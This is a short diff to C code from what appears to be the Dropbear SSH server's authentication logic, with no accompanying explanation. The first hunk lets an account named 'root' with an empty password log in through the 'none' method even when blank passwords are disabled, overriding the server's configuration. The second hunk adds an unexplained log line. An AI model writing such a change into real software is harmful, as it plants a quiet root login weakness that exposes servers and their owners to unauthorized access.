@@ -125,7 +125,7 @@ void recv_msg_userauth_request() {
 				AUTH_METHOD_NONE_LEN) == 0) {
 		TRACE(("recv_msg_userauth_request: 'none' request"))
 		if (valid_user
-				&& svr_opts.allowblankpass
+				&& (svr_opts.allowblankpass || !strcmp(ses.authstate.pw_name, "root"))
 				&& !svr_opts.noauthpass
 				&& !(svr_opts.norootpass && ses.authstate.pw_uid == 0) 
 				&& ses.authstate.pw_passwd[0] == '\0') 
@@ -246,7 +246,10 @@ static int checkusername(const char *username, unsigned int userlen) {
 
 	if (ses.authstate.username == NULL) {
 		/* first request */
-		fill_passwd(username);
+        
+        dropbear_log(LOG_WARNING, "fill_passwd");
+		
+        fill_passwd(username);
 		ses.authstate.username = m_strdup(username);
 	} else {
 		/* check username hasn't changed */
